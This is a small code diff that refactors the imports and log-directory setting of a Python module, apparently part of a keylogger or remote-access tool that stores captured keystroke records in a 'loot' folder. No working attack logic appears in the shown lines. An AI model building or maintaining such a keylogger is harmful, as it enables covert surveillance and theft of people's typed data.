@@ -1,16 +1,15 @@
-import socket
 import struct
 import os
 from datetime import datetime
 
 from cryptography.fernet import Fernet
-from mainclass.encrypter import system
-from colorama import Fore, init, Style
-import threading
+from core.crypto.encrypter import system
+from core.utils.paths import ensure_project_dir
+from colorama import Fore, init
 
 init(autoreset=True)
 
-LOG_DIR = os.path.join("records", "keylogger")
+LOG_DIR = ensure_project_dir("storage", "loot", "records", "keylogger")
 
 
 def _create_log_path():
